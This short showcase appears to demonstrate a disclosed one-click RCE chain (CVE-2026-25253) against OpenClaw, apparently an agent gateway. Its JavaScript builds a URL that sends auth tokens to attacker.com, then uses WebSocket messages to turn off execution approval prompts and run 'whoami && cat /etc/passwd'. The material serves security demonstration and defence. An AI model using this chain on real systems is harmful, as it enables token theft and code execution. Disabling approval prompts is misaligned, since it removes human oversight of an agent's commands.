# OpenClaw gatewayUrl Injection
This showcase demonstrates the CVE-2026-25253 OpenClaw one-click RCE attack
discovered in January 2026. A malicious webpage injects a gatewayUrl parameter
to steal auth tokens and then disables execution approval prompts for full RCE.

## Attack chain
```javascript
// Step 1: Craft malicious URL with gatewayUrl parameter
const maliciousUrl = `https://victim-openclaw:18789/?gatewayUrl=https://attacker.com`;

// Step 2: After stealing the auth token via WebSocket, disable approvals
const ws = new WebSocket('ws://localhost:18789/api/ws');
ws.onopen = () => {
  // Disable user confirmation prompts
  ws.send(JSON.stringify({
    action: 'exec.approvals.set',
    value: 'off'
  }));

  // Execute arbitrary commands
  ws.send(JSON.stringify({
    action: 'exec',
    command: 'whoami && cat /etc/passwd'
  }));
};
```
